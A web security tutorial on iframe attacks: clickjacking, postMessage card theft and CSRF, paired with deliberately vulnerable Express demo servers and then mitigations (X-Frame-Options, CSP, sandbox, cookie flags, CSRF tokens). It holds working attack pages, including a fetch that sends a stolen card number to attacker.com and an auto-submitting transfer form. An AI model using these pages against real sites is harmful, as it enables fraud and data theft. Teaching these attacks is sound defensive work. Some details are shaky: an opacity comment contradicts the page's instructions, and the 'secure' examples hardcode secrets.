# Iframe Security Vulnerabilities & Mitigation Guide

## Table of Contents
1. [Clickjacking (UI Redressing)](#clickjacking)
2. [Data Theft via JavaScript](#data-theft)
3. [Session & Cookie Theft](#session-cookie-theft)
4. [Mitigation Strategies](#mitigation)

---

## 1. Clickjacking (UI Redressing) {#clickjacking}

### What is Clickjacking?
Clickjacking is an attack where a malicious website loads your website in a transparent iframe overlaying it on top of fake content. Users think they're clicking on the attacker's page but are actually clicking on your hidden page underneath.

### How It Works
1. Attacker creates a malicious page
2. Embeds your website in an invisible iframe
3. Overlays fake buttons/content on top
4. User clicks thinking they're on attacker's site
5. Actually performs actions on your site (transfers money, changes settings, etc.)

### Real-Life Example
**Famous Case**: Twitter "Don't Click" button (2009)
- Attackers embedded Twitter's "Follow" button in an invisible iframe
- Users thought they were playing a game ("Don't Click the Button")
- When they clicked, they unknowingly followed the attacker's account
- Attack went viral with thousands of followers gained

### Visual Representation
```
┌─────────────────────────────────┐
│  Attacker's Website             │
│  ┌───────────────────────────┐  │
│  │ "Click Here for Free $$$" │  │ ← User sees this
│  └───────────────────────────┘  │
│         ↓ (Overlaid)             │
│  ┌───────────────────────────┐  │
│  │ YOUR SITE (transparent)   │  │ ← Your site hidden
│  │ [Delete Account Button]   │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
```

### Code Example

you jusr need to start server.

**Attacker's Page (attacker.html)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Win $1000 - Free Giveaway!</title>
    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        h1 {
            font-size: 48px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 24px;
            margin-bottom: 30px;
        }
        
        .game-container {
            position: relative;
            width: 500px;
            height: 300px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            overflow: hidden;
        }
        
        /* Transparent iframe overlaid on top */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 500px;
            height: 300px;
            border: none;
            /* CHANGE THIS TO SEE THE ATTACK */
            opacity: 0.5; /* Set to 0.01 to make it invisible! */
            z-index: 2;
            pointer-events: auto;
        }
        
        /* Fake button underneath */
        .fake-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
            padding: 30px 60px;
            background: linear-gradient(45deg, #ff6b6b, #ff4444);
            color: white;
            font-size: 32px;
            font-weight: bold;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            cursor: pointer;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
        }
        
        .instructions {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .warning {
            color: #ffeb3b;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>🎉 CONGRATULATIONS! 🎉</h1>
    <p class="subtitle">You've been selected to win $1000!</p>
    <p>Click the button below to claim your prize NOW!</p>
    
    <div class="game-container">
        <!-- This is what the user SEES -->
        <div class="fake-button">CLAIM $1000 NOW!</div>
        
        <!-- This is what they're ACTUALLY clicking (invisible) -->
        <iframe src="http://localhost:3000/bank"></iframe>
    </div>
    
    <div class="instructions">
        <h3>🔍 HOW THIS ATTACK WORKS:</h3>
        <p>1. You see the red "CLAIM PRIZE" button</p>
        <p>2. But there's an invisible bank website on top</p>
        <p>3. When you click, you actually click the bank's transfer button!</p>
        <p class="warning">⚠️ To see the hidden iframe, edit the HTML and change "opacity: 0.01" to "opacity: 0.5"</p>
    </div>
    
    <script>
        // Log when iframe loads
        window.addEventListener('load', () => {
            console.log('Clickjacking page loaded!');
            console.log('The iframe is nearly invisible but clickable');
        });
    </script>
</body>
</html>
```

**Vulnerable Bank Site (server.js)**
```javascript
import express from "express";
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(express.urlencoded({ extended: true }));

// Serve the attacker's page (clickjacking page)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// VULNERABLE: No X-Frame-Options header
app.get('/bank', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body { 
                    font-family: Arial; 
                    margin: 0;
                    padding: 0;
                    width: 500px;
                    height: 300px;
                    position: relative;
                    overflow: hidden;
                }
                .content {
                    padding: 10px;
                    opacity: 0.3;
                }
                h2 {
                    margin: 0 0 5px 0;
                    font-size: 16px;
                }
                p {
                    margin: 0 0 10px 0;
                    font-size: 12px;
                }
                button { 
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 500px;
                    height: 300px;
                    background: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 0;
                    font-size: 32px;
                    font-weight: bold;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                button:hover { background: #45a049; }
            </style>
        </head>
        <body>
            <div class="content">
                <h2>Bank Transfer Portal</h2>
                <p>Transfer money to account: <strong>ATTACKER-ACCOUNT</strong></p>
            </div>
            <form action="/transfer" method="POST">
                <button type="submit">Confirm Transfer $5000</button>
            </form>
        </body>
        </html>
    `);
});

app.post('/transfer', (req, res) => {
    res.send(`
        <html>
        <body style="font-family: Arial; padding: 20px;">
            <h1 style="color: red;">⚠️ MONEY TRANSFERRED!</h1>
            <p style="font-size: 20px;">$5000 has been sent to ATTACKER-ACCOUNT</p>
            <p>This is what happens in a clickjacking attack!</p>
        </body>
        </html>
    `);
});

app.listen(3000, () => {
    console.log('🚀 Server running!');
    console.log('📄 Attacker page: http://localhost:3000');
    console.log('🏦 Bank page: http://localhost:3000/bank');
});
```


How to prevent this attack?
just add
```javascript
res.setHeader('X-Frame-Options', 'DENY');
```
so your website could not be loaded in iframe

---

## 2. Data Theft via JavaScript {#data-theft}

### What is Data Theft via Iframe?
When your site is embedded in an iframe, the parent page can potentially access data through:
- **Same-Origin Policy bypass** (if domains match)
- **PostMessage vulnerabilities**
- **DOM manipulation** (limited by SOP)
- **Referrer leakage**

### How It Works
1. Attacker embeds your site in iframe
2. Uses JavaScript to attempt data access
3. Exploits misconfigured postMessage handlers
4. Steals user input, tokens, or sensitive data

### Real-Life Example
**Google Docs Phishing (2017)**
- Attackers sent emails with "Google Docs" link
- Link opened a fake OAuth consent screen in iframe
- Screen looked identical to Google's real consent
- Users granted permissions, giving access to Gmail
- Worm spread by sending emails to all contacts

### Same-Origin vs Cross-Origin

```
Same-Origin (Dangerous):
https://bank.com/page1 → iframe → https://bank.com/page2
✓ Parent can access iframe content
✓ Can read DOM, steal data

Cross-Origin (Protected):
https://attacker.com → iframe → https://bank.com
✗ Parent CANNOT access iframe content
✓ Same-Origin Policy blocks access
```

### Code Example

**Vulnerable Site with PostMessage (vulnerable-site.js)**
```javascript
const express = require('express');
const app = express();

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Payment Portal</title>
        </head>
        <body>
            <h1>Secure Payment Portal</h1>
            <input type="text" id="creditCard" placeholder="Credit Card Number">
            <button onclick="processPayment()">Pay Now</button>
            
            <script>
                // VULNERABLE: Accepts messages from ANY origin
                window.addEventListener('message', function(event) {
                    // No origin check!
                    if (event.data.action === 'getCardNumber') {
                        const cardNumber = document.getElementById('creditCard').value;
                        event.source.postMessage({
                            card: cardNumber
                        }, '*'); // Sends to ANY origin!
                    }
                });
                
                function processPayment() {
                    alert('Payment processed!');
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(3000);
```

**Attacker's Site (attacker-steal.html)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Site</title>
</head>
<body>
    <h1>Complete Your Order</h1>
    <p>Please enter payment details in the form below:</p>
    
    <!-- Embedded vulnerable site -->
    <iframe id="paymentFrame" 
            src="http://localhost:3000" 
            width="600" 
            height="300"></iframe>
    
    <script>
        window.addEventListener('load', function() {
            // Wait for user to enter card details
            setTimeout(function() {
                const iframe = document.getElementById('paymentFrame');
                
                // Request credit card data
                iframe.contentWindow.postMessage({
                    action: 'getCardNumber'
                }, '*');
                
                // Listen for response
                window.addEventListener('message', function(event) {
                    if (event.data.card) {
                        console.log('Stolen card:', event.data.card);
                        // Send to attacker's server
                        fetch('https://attacker.com/steal', {
                            method: 'POST',
                            body: JSON.stringify({ card: event.data.card })
                        });
                    }
                });
            }, 5000);
        });
    </script>
</body>
</html>
```

### What Goes Wrong?
- No origin validation in `postMessage` listener
- Sends data to `'*'` (any origin)
- Attacker can request and receive sensitive data

---

## 3. Session & Cookie Theft {#session-cookie-theft}

### What is Session/Cookie Theft via Iframe?
Cookies attached to requests when your site loads in an iframe can be exploited through:
- **CSRF attacks** (Cross-Site Request Forgery)
- **XSS in iframe** context
- **Cookie leakage** without proper flags

### How It Works
1. User is logged into your site (has session cookie)
2. Visits attacker's page with your site in iframe
3. Browser automatically sends cookies with iframe requests
4. Attacker triggers actions using user's authenticated session
5. Can change password, transfer money, etc.

### Real-Life Example
**Facebook CSRF via Iframe (2013)**
- Researcher found Facebook's "Add Friend" had CSRF vulnerability
- Could be triggered via iframe without user interaction
- Attacker embedded Facebook pages in invisible iframes
- Automatically sent friend requests to attacker's accounts
- Fixed by adding CSRF tokens and X-Frame-Options

### Cookie Flags Explained

| Flag | Purpose | Example |
|------|---------|---------|
| **HttpOnly** | Prevents JavaScript access to cookie | `document.cookie` returns empty |
| **Secure** | Only sent over HTTPS | Cookie not sent on HTTP |
| **SameSite** | Controls cross-site cookie sending | Blocks CSRF attacks |

### SameSite Values
- **Strict**: Cookie NEVER sent in cross-site requests (even links)
- **Lax**: Cookie sent on top-level navigation (clicking links), not iframes
- **None**: Cookie sent everywhere (requires Secure flag)

### Code Example

**Vulnerable Banking App (vulnerable-bank.js)**
```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

// Login endpoint - INSECURE COOKIES
app.post('/login', (req, res) => {
    // VULNERABLE: No HttpOnly, Secure, or SameSite
    res.cookie('sessionId', 'user123-secret-token', {
        httpOnly: false,    // JavaScript CAN access!
        secure: false,       // Sent over HTTP too!
        sameSite: 'none'     // Sent to any site!
    });
    
    res.redirect('/dashboard');
});

// Dashboard page
app.get('/dashboard', (req, res) => {
    const sessionId = req.cookies.sessionId;
    
    if (!sessionId) {
        return res.redirect('/login');
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Your Bank Dashboard</h1>
            <p>Balance: $10,000</p>
            
            <form action="/transfer" method="POST">
                <input type="text" name="to" placeholder="Transfer to">
                <input type="number" name="amount" placeholder="Amount">
                <button type="submit">Transfer Money</button>
            </form>
            
            <script>
                // Cookie is accessible to JavaScript!
                console.log('Session:', document.cookie);
            </script>
        </body>
        </html>
    `);
});

// VULNERABLE: No CSRF protection
app.post('/transfer', (req, res) => {
    const sessionId = req.cookies.sessionId;
    
    if (sessionId) {
        const { to, amount } = req.body;
        console.log(`Transferred $${amount} to ${to}`);
        res.send(`Transferred $${amount} to ${to}`);
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(3000);
```

**Attacker's CSRF Page (csrf-attack.html)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Movie Download</title>
</head>
<body>
    <h1>Click here to download movie!</h1>
    
    <!-- Hidden iframe that auto-submits form -->
    <iframe name="hiddenFrame" style="display:none;"></iframe>
    
    <form id="attackForm" 
          action="http://localhost:3000/transfer" 
          method="POST" 
          target="hiddenFrame">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="5000">
    </form>
    
    <script>
        // Auto-submit when page loads
        window.onload = function() {
            // If user is logged into bank, cookies are sent!
            document.getElementById('attackForm').submit();
        };
    </script>
    
    <p>Downloading... Please wait...</p>
</body>
</html>
```

### What Goes Wrong?
1. User logged into bank (has session cookie)
2. Visits attacker's page
3. Hidden form auto-submits to bank
4. **Browser sends session cookie automatically** (SameSite=none)
5. Transfer executes with user's credentials

---

## 4. Mitigation Strategies {#mitigation}

### A. X-Frame-Options Header

Tells browsers whether your site can be embedded in iframes.

**Values:**
- `DENY` - Cannot be framed by anyone
- `SAMEORIGIN` - Can only be framed by same domain
- `ALLOW-FROM uri` - Can be framed by specific domain (deprecated)

**Express Implementation:**
```javascript
const express = require('express');
const app = express();

// Method 1: Manual header
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// Method 2: Using helmet middleware
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));

app.get('/', (req, res) => {
    res.send('<h1>This page cannot be framed!</h1>');
});

app.listen(3000);
```

**Testing:**
```html
<!-- This will be blocked -->
<iframe src="http://localhost:3000"></iframe>
<!-- Browser shows error: Refused to display in frame -->
```

### B. Content-Security-Policy (CSP) frame-ancestors

Modern, more flexible alternative to X-Frame-Options.

**Syntax:**
```
Content-Security-Policy: frame-ancestors 'none' | 'self' | uri
```

**Values:**
- `'none'` - Same as X-Frame-Options: DENY
- `'self'` - Same as X-Frame-Options: SAMEORIGIN
- `https://trusted.com` - Allow specific domains

**Express Implementation:**
```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// Option 1: Helmet CSP
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'self'", "https://trusted-partner.com"]
    }
}));

// Option 2: Manual CSP
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "frame-ancestors 'self' https://trusted-partner.com"
    );
    next();
});

app.get('/', (req, res) => {
    res.send('<h1>Protected with CSP!</h1>');
});

app.listen(3000);
```

**Advantages over X-Frame-Options:**
- Can specify multiple domains
- More granular control
- Part of broader CSP policy
- Better browser support for modern features

### C. Sandbox Iframe Attribute

Restricts what embedded iframes can do.

**Sandbox Flags:**
- `allow-forms` - Allow form submission
- `allow-scripts` - Allow JavaScript
- `allow-same-origin` - Treat as same origin
- `allow-popups` - Allow popups
- `allow-top-navigation` - Allow navigation of top window

**Safe Embedding Example:**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Safely Embedded Content</h1>
    
    <!-- Minimal permissions -->
    <iframe src="untrusted-content.html" 
            sandbox="allow-scripts">
    </iframe>
    
    <!-- No sandbox = DANGEROUS (full permissions) -->
    <iframe src="untrusted-content.html"></iframe>
    
    <!-- Read-only content (no scripts, forms) -->
    <iframe src="article.html" 
            sandbox="">
    </iframe>
    
    <!-- Allow forms but not scripts -->
    <iframe src="survey.html" 
            sandbox="allow-forms">
    </iframe>
</body>
</html>
```

**Express Server Serving Sandboxed Content:**
```javascript
const express = require('express');
const app = express();

app.get('/embed-untrusted', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Embedding Untrusted Content Safely</h1>
            
            <!-- User-submitted content with restrictions -->
            <iframe src="/user-content" 
                    sandbox="allow-scripts"
                    style="width:100%; height:400px; border:1px solid #ccc;">
            </iframe>
        </body>
        </html>
    `);
});

app.get('/user-content', (req, res) => {
    // User-generated content that's potentially dangerous
    res.send(`
        <h2>User Content</h2>
        <script>
            // This script is sandboxed
            alert('I can run but cannot access parent!');
            // Cannot access: parent.document
            // Cannot navigate top window
        </script>
    `);
});

app.listen(3000);
```

### D. Secure Cookie Configuration

**Complete Secure Cookie Setup:**
```javascript
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

// SECURE Session Configuration
app.use(session({
    secret: 'your-secret-key-change-this',
    name: 'sessionId', // Don't use default 'connect.sid'
    cookie: {
        httpOnly: true,      // Prevents JavaScript access
        secure: true,        // Only sent over HTTPS
        sameSite: 'strict',  // Blocks CSRF attacks
        maxAge: 3600000,     // 1 hour expiration
        domain: 'yourdomain.com', // Restrict to your domain
    },
    resave: false,
    saveUninitialized: false
}));

// Login with secure cookie
app.post('/login', (req, res) => {
    // Authenticate user...
    req.session.userId = 'user123';
    
    // Set additional secure cookie
    res.cookie('authToken', 'token-value', {
        httpOnly: true,   // Cannot be read by JavaScript
        secure: true,     // HTTPS only
        sameSite: 'lax',  // Sent on same-site & top-level navigation
        maxAge: 86400000, // 24 hours
        signed: true      // Cryptographically signed
    });
    
    res.send('Logged in securely!');
});

// Protected route
app.get('/dashboard', (req, res) => {
    if (!req.session.userId) {
        return res.status(401).send('Unauthorized');
    }
    
    res.send(`
        <h1>Dashboard</h1>
        <p>Welcome, ${req.session.userId}</p>
        <script>
            // This will NOT show httpOnly cookies
            console.log('Cookies:', document.cookie); // Empty or non-httpOnly only
        </script>
    `);
});

app.listen(3000);
```

### E. Complete Secure Implementation

**Full Security Setup (secure-app.js):**
```javascript
const express = require('express');
const helmet = require('helmet');
const session = require('express-session');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();

// 1. HELMET - Security headers
app.use(helmet({
    // Prevent clickjacking
    frameguard: { action: 'deny' },
    
    // Content Security Policy
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            frameAncestors: ["'none'"], // Cannot be framed
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"]
        }
    },
    
    // Other security headers
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// 2. COOKIE PARSER
app.use(cookieParser('secret-for-signed-cookies'));

// 3. SECURE SESSION
app.use(session({
    secret: process.env.SESSION_SECRET || 'change-this-secret',
    name: '__Host-sessionId', // Secure prefix
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 3600000
    },
    resave: false,
    saveUninitialized: false
}));

// 4. CSRF PROTECTION
app.use(express.urlencoded({ extended: true }));
const csrfProtection = csrf({ cookie: false }); // Use session, not cookies

// Login page
app.get('/login', csrfProtection, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Secure Login</h1>
            <form method="POST" action="/login">
                <input type="text" name="username" required>
                <input type="password" name="password" required>
                <!-- CSRF Token -->
                <input type="hidden" name="_csrf" value="${req.csrfToken()}">
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    `);
});

// Login handler
app.post('/login', csrfProtection, (req, res) => {
    const { username, password } = req.body;
    
    // Validate credentials (simplified)
    if (username === 'admin' && password === 'password') {
        req.session.userId = username;
        res.redirect('/dashboard');
    } else {
        res.status(401).send('Invalid credentials');
    }
});

// Protected dashboard
app.get('/dashboard', csrfProtection, (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Dashboard - ${req.session.userId}</h1>
            <p>Balance: $10,000</p>
            
            <h2>Transfer Money</h2>
            <form method="POST" action="/transfer">
                <input type="text" name="to" placeholder="Recipient" required>
                <input type="number" name="amount" placeholder="Amount" required>
                <!-- CSRF Token -->
                <input type="hidden" name="_csrf" value="${req.csrfToken()}">
                <button type="submit">Transfer</button>
            </form>
            
            <form method="POST" action="/logout">
                <input type="hidden" name="_csrf" value="${req.csrfToken()}">
                <button type="submit">Logout</button>
            </form>
        </body>
        </html>
    `);
});

// Transfer with CSRF protection
app.post('/transfer', csrfProtection, (req, res) => {
    if (!req.session.userId) {
        return res.status(401).send('Unauthorized');
    }
    
    const { to, amount } = req.body;
    console.log(`${req.session.userId} transferred $${amount} to ${to}`);
    res.send(`Successfully transferred $${amount} to ${to}`);
});

// Logout
app.post('/logout', csrfProtection, (req, res) => {
    req.session.destroy();
    res.clearCookie('__Host-sessionId');
    res.redirect('/login');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Secure server running on port ${PORT}`);
});
```

---

## Summary: Defense-in-Depth Strategy

| Attack Vector | Primary Defense | Secondary Defense |
|---------------|----------------|-------------------|
| **Clickjacking** | X-Frame-Options: DENY | CSP frame-ancestors 'none' |
| **Data Theft** | Validate postMessage origins | CSP, input sanitization |
| **CSRF** | CSRF tokens | SameSite cookies (strict/lax) |
| **Cookie Theft** | HttpOnly + Secure flags | SameSite: strict |
| **XSS in Iframe** | Sandbox attribute | CSP script-src |

### Best Practices Checklist

✅ **Headers:**
- [ ] Set `X-Frame-Options: DENY` or `SAMEORIGIN`
- [ ] Set `CSP: frame-ancestors 'self'`
- [ ] Use Helmet.js for automatic headers

✅ **Cookies:**
- [ ] Set `httpOnly: true` (no JavaScript access)
- [ ] Set `secure: true` (HTTPS only)
- [ ] Set `sameSite: 'strict'` or `'lax'`
- [ ] Use secure cookie names (`__Host-` prefix)
- [ ] Set reasonable expiration times

✅ **CSRF Protection:**
- [ ] Implement CSRF tokens for state-changing operations
- [ ] Validate tokens on server side
- [ ] Use SameSite cookies as additional layer

✅ **Iframe Embedding:**
- [ ] Use `sandbox` attribute when embedding untrusted content
- [ ] Limit sandbox permissions to minimum required
- [ ] Validate postMessage origins explicitly
- [ ] Never send sensitive data via postMessage to `'*'`

✅ **General Security:**
- [ ] Use HTTPS in production
- [ ] Keep dependencies updated
- [ ] Implement proper authentication/authorization
- [ ] Log security events for monitoring

### Testing Your Implementation

```bash
# Test X-Frame-Options
curl -I http://localhost:3000 | grep X-Frame-Options

# Test CSP
curl -I http://localhost:3000 | grep Content-Security-Policy

# Test cookies
curl -I http://localhost:3000/login | grep Set-Cookie
```

---

## Additional Resources

- [OWASP Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN: CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)
- [Using HTTP cookies (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Helmet.js Documentation](https://helmetjs.github.io/)